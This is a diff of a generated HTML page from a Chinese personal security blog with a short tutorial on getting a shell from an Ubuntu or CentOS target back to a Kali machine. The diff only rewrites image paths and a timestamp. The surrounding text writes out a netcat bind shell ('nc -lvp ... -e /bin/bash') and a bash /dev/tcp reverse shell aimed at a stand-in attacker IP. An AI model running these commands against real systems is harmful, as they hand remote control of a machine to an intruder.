@@ -23,14 +23,14 @@
 <meta property="og:site_name" content="Rounuooo的小站">
 <meta property="og:description" content="假如ubuntu、CentOS为目标服务器系统 kali为攻击者的系统，ip为：192.168.0.4，开放7777端口且没被占用 最终是将ubuntu、CentOS的shell反弹到kali上 正向反弹shell目标机(ubuntu或者CentOS)上面输入1nc -lvp 端口号 -e &#x2F;bin&#x2F;bash  攻击机上输入1nc ip 端口号  正向反弹是目标机先执行nc命令，然后攻击机上再进行">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/image-20221019201817575.png">
+<meta property="og:image" content="http://example.com/.com//image-20221019201817575.png">
 <meta property="og:image" content="http://example.com/images/image-20221019201951687.png">
 <meta property="og:image" content="http://example.com/images/image-20221019202129236.png">
 <meta property="article:published_time" content="2022-10-19T12:30:37.000Z">
-<meta property="article:modified_time" content="2022-10-19T12:31:05.002Z">
+<meta property="article:modified_time" content="2022-10-19T12:53:18.239Z">
 <meta property="article:author" content="Rounuooo">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/image-20221019201817575.png">
+<meta name="twitter:image" content="http://example.com/.com//image-20221019201817575.png">
   
   
   
@@ -286,7 +286,7 @@
 <p>正向反弹是目标机先执行nc命令，然后攻击机上再进行nc监听，即可反弹shell。</p>
 <p>需要目标机安装nc。</p>
 <h3 id="反向反弹shell"><a href="#反向反弹shell" class="headerlink" title="反向反弹shell"></a>反向反弹shell</h3><p>方法1：bash反弹</p>
-<h5 id="被控制端-bash-i-gt-amp-x2F-dev-x2F-tcp-x2F-攻击机的ip-x2F-port-0-gt-amp-1"><a href="#被控制端-bash-i-gt-amp-x2F-dev-x2F-tcp-x2F-攻击机的ip-x2F-port-0-gt-amp-1" class="headerlink" title="被控制端:	bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机的ip&#x2F;port 0&gt;&amp;1"></a>被控制端:	bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机的ip&#x2F;port 0&gt;&amp;1</h5><p><img src="/images/image-20221019201817575.png" srcset="/img/loading.gif" lazyload alt="image-20221019201817575"></p>
+<h5 id="被控制端-bash-i-gt-amp-x2F-dev-x2F-tcp-x2F-攻击机的ip-x2F-port-0-gt-amp-1"><a href="#被控制端-bash-i-gt-amp-x2F-dev-x2F-tcp-x2F-攻击机的ip-x2F-port-0-gt-amp-1" class="headerlink" title="被控制端:	bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机的ip&#x2F;port 0&gt;&amp;1"></a>被控制端:	bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;攻击机的ip&#x2F;port 0&gt;&amp;1</h5><p><img src="/.com//image-20221019201817575.png" srcset="/img/loading.gif" lazyload alt="image-20221019201817575"></p>
 <h5 id="但首先需要在攻击机上使用nc监听端口：nc-lvp-端口号"><a href="#但首先需要在攻击机上使用nc监听端口：nc-lvp-端口号" class="headerlink" title="但首先需要在攻击机上使用nc监听端口：nc -lvp 端口号"></a>但首先需要在攻击机上使用nc监听端口：nc -lvp 端口号</h5><p><img src="/images/image-20221019201951687.png" srcset="/img/loading.gif" lazyload alt="image-20221019201951687"></p>
 <p>此时就可以获得shell</p>
 <p><img src="/images/image-20221019202129236.png" srcset="/img/loading.gif" lazyload alt="image-20221019202129236"></p>
